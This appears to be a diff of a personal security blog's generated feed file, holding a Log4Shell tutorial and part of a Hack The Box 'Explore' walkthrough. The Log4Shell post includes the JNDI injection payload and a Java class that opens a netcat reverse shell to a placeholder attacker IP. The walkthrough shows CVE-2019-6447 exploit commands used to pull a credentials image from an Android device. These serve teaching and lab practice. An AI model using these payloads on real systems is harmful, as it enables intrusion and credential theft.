@@ -14,15 +14,15 @@
       
       <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
       <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
-logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
+logging.ERROR(&amp;#34;error&amp;#34;);logging.WARN(&amp;#34;warning&amp;#34;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
       <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
-logging.WARN(&amp;quot;warning&amp;quot;);
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;logging.ERROR(&amp;#34;error&amp;#34;);
+logging.WARN(&amp;#34;warning&amp;#34;);
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.&lt;/li&gt;
@@ -37,15 +37,15 @@ logging.WARN(&amp;quot;warning&amp;quot;);
 &lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
 &lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Now in port 8000, the compiled class of the following java code is served.
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
-            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
-        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
-            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
-        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 The code just sends a reverse shell to the attacker.&lt;/p&gt;
 &lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -70,13 +70,13 @@ The code just sends a reverse shell to the attacker.&lt;/p&gt;
 Points: 20
 Difficulty: Easy
 ip = 10.10.10.247
-nmap scan PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 4501/tcp closed unknown 5555/tcp filtered freeciv 7135/tcp closed unknown 8705/tcp closed unknown 17330/tcp closed unknown 17338/tcp closed unknown 20873/tcp closed unknown 25959/tcp closed unknown 32381/tcp closed unknown 33431/tcp closed unknown 36745/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
+nmap scan PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey:|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)4501/tcp closed unknown5555/tcp filtered freeciv7135/tcp closed unknown8705/tcp closed unknown17330/tcp closed unknown17338/tcp closed unknown20873/tcp closed unknown25959/tcp closed unknown32381/tcp closed unknown33431/tcp closed unknown36745/tcp open unknown| fingerprint-strings:| GenericLines:| HTTP/1.</description>
       <content>&lt;p&gt;OS: Android&lt;br&gt;
 Points: 20&lt;br&gt;
 Difficulty: Easy&lt;/p&gt;
 &lt;p&gt;ip = 10.10.10.247&lt;/p&gt;
 &lt;h4 id=&#34;nmap-scan&#34;&gt;nmap scan&lt;/h4&gt;
-&lt;pre&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
 2222/tcp  open     ssh     (protocol 2.0)
 | fingerprint-strings:
 |   NULL:
@@ -162,52 +162,52 @@ Difficulty: Easy&lt;/p&gt;
 55744/tcp closed   unknown
 56823/tcp closed   unknown
 59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
-|_http-title: Site doesn&#39;t have a title (text/plain).
+|_http-title: Site doesn&amp;#39;t have a title (text/plain).
 60540/tcp closed   unknown
 60600/tcp closed   unknown
 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,24,&amp;quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;quot;);
+SF:LL,24,&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;);
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
-SF:enericLines,AA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
+SF:enericLines,AA,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
 SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
 SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
-SF:r\nInvalid\x20request\x20line:\x20&amp;quot;)%r(GetRequest,5C,&amp;quot;HTTP/1\.1\x20412\
+SF:r\nInvalid\x20request\x20line:\x20&amp;#34;)%r(GetRequest,5C,&amp;#34;HTTP/1\.1\x20412\
 SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
-SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;quot;)%r(HTTPOptions,B5,&amp;quot;HTTP/1\
+SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;)%r(HTTPOptions,B5,&amp;#34;HTTP/1\
 SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
 SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
 SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
-SF:0supported:\x20OPTIONS&amp;quot;)%r(RTSPRequest,BB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20R
+SF:0supported:\x20OPTIONS&amp;#34;)%r(RTSPRequest,BB,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20R
 SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
 SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
 SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
-SF:\x20\x20RTSP/1\.0&amp;quot;)%r(Help,AE,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
+SF:\x20\x20RTSP/1\.0&amp;#34;)%r(Help,AE,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
 SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
 SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
-SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;quot;)%r(SSLSessionReq
-SF:,DD,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
+SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;#34;)%r(SSLSessionReq
+SF:,DD,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
 SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
 SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
 SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
-SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;quot;)%r(TerminalSe
-SF:rverCookie,CA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
+SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;#34;)%r(TerminalSe
+SF:rverCookie,CA,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
 SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
 SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
 SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
-SF:hash=nmap&amp;quot;)%r(TLSSessionReq,DB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
+SF:hash=nmap&amp;#34;)%r(TLSSessionReq,DB,&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
 SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
 SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
 SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
-SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;quot;);
+SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;#34;);
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
 &lt;p&gt;There is a http server running on port &lt;code&gt;57999&lt;/code&gt;. Opening the page &lt;code&gt;http://10.10.10.247:59777/&lt;/code&gt; on browser
 gives the output&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;FORBIDDEN: No directory listing.
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FORBIDDEN: No directory listing.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using gobuster I tried to find other directories.&lt;code&gt;gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir&lt;/code&gt;, output:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
 /bin                  (Status: 301) [Size: 63] [--&amp;gt; /bin/]
 /cache                (Status: 301) [Size: 67] [--&amp;gt; /cache/]
 /config               (Status: 301) [Size: 69] [--&amp;gt; /config/]
@@ -229,107 +229,107 @@ gives the output&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all directories listing is forbidden. I tried to get any credentials. But &lt;code&gt;/etc/ssh&lt;/code&gt; and  &lt;code&gt;/etc/passwd&lt;/code&gt; are not available. For &lt;code&gt;/init&lt;/code&gt; the reading of the file was forbidden. &lt;code&gt;/etc/hosts&lt;/code&gt; was available and while going to that file &lt;code&gt;http://10.10.10.247:59777/etc/hosts&lt;/code&gt;, it was getting downloaded.&lt;/p&gt;
 &lt;p&gt;So there are files in the machine and some which are readible to us. We have to &lt;strong&gt;explore files&lt;/strong&gt; in the machine. Searching for &amp;ldquo;explore file android exploits&amp;rdquo;.&lt;/p&gt;
 &lt;p&gt;The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to &lt;code&gt;59777&lt;/code&gt;. Lets see exploits help&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 help
-USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]
-
-┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
-[-] WRONG COMMAND!
-Available commands :
-  listFiles         : List all Files.
-  listPics          : List all Pictures.
-  listVideos        : List all videos.
-  listAudios        : List all audios.
-  listApps          : List Applications installed.
-  listAppsSystem    : List System apps.
-  listAppsPhone     : List Communication related apps.
-  listAppsSdcard    : List apps on the SDCard.
-  listAppsAll       : List all Application.
-  getFile           : Download a file.
-  getDeviceInfo     : Get device info.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 help
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] WRONG COMMAND!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Available commands :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listFiles         : List all Files.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listPics          : List all Pictures.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listVideos        : List all videos.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAudios        : List all audios.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listApps          : List Applications installed.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsSystem    : List System apps.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsPhone     : List Communication related apps.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsSdcard    : List apps on the SDCard.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  listAppsAll       : List all Application.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  getFile           : Download a file.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  getDeviceInfo     : Get device info.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
 Using &lt;code&gt;listPics&lt;/code&gt; I get a image of credentials.&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
-
-==================================================================
-|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
-|                Coded By : Nehal a.k.a PwnerSec                 |
-==================================================================
-
-name : concept.jpg
-time : 4/21/21 02:38:08 AM
-location : /storage/emulated/0/DCIM/concept.jpg
-size : 135.33 KB (138,573 Bytes)
-
-name : anc.png
-time : 4/21/21 02:37:50 AM
-location : /storage/emulated/0/DCIM/anc.png
-size : 6.24 KB (6,392 Bytes)
-
-name : creds.jpg
-time : 4/21/21 02:38:18 AM
-location : /storage/emulated/0/DCIM/creds.jpg
-size : 1.14 MB (1,200,401 Bytes)
-
-name : 224_anc.png
-time : 4/21/21 02:37:21 AM
-location : /storage/emulated/0/DCIM/224_anc.png
-size : 124.88 KB (127,876 Bytes)
-
-
-┌──(kali㉿kali)-[~/HTB/Explore]
-└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
-
-==================================================================
-|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
-|                Coded By : Nehal a.k.a PwnerSec                 |
-==================================================================
-
-[+] Downloading file...
-[+] Done. Saved as `out.dat`.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The image contains:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;kristi
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|                Coded By : Nehal a.k.a PwnerSec                 |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==================================================================
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : concept.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:38:08 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/concept.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 135.33 KB (138,573 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:37:50 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 6.24 KB (6,392 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:38:18 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/creds.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;size : 1.14 MB (1,200,401 Bytes)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : 224_anc.png
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time : 4/21/21 02:37:21 AM
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location : /storage/emulated/0/DCIM/224_anc.png
